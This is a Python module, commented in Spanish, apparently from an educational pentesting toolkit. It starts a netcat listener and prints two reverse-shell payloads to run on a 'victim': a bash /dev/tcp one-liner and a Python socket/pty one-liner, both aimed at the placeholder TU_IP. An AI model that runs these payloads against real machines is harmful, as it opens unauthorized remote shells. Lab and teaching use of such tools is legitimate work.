"""Listener Netcat para recepción de reverse shells."""
import shutil
import subprocess
from colorama import Fore, Style

from ..ui import _line, _prompt, _err, edu_print


def run_netcat_listener(workspace_dir):
    if shutil.which('nc') is None and shutil.which('ncat') is None:
        _err("Netcat (nc/ncat) no encontrado. Instala con: sudo apt install netcat-traditional")
        return

    nc_bin = 'nc' if shutil.which('nc') else 'ncat'

    edu_print(
        tool="Netcat (Listener)",
        phase="Post-Explotacion -- Recepcion de Reverse Shell",
        explanation="- 'nc -lvnp <puerto>': Abre un socket TCP en escucha en tu maquina.\n"
                    "- La victima ejecutara: bash -i >& /dev/tcp/TU_IP/<puerto> 0>&1\n"
                    "- Cuando conecte recibiras una shell interactiva en esta terminal.\n"
                    "- -l: listen | -v: verbose | -n: sin DNS | -p: puerto"
    )

    port = _prompt("Puerto de escucha (Enter para 4444)").strip()
    if not port:
        port = "4444"

    _line("-", Fore.RED)
    print(f"  {Fore.RED}>> ESCUCHANDO en 0.0.0.0:{port} -- Ctrl+C para cerrar{Style.RESET_ALL}")
    _line("-", Fore.RED)
    print(f"\n  {Fore.YELLOW}Payload de ejemplo para Linux (ejecutar en la victima):{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}bash -i >& /dev/tcp/TU_IP/{port} 0>&1{Style.RESET_ALL}")
    print(f"\n  {Fore.YELLOW}Payload alternativo (Python):{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"TU_IP\",{port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'{Style.RESET_ALL}")
    print()

    try:
        subprocess.run([nc_bin, '-lvnp', port])
    except KeyboardInterrupt:
        print(f"\n{Fore.GREEN}[+] Listener cerrado. Retornando al menu.{Style.RESET_ALL}")
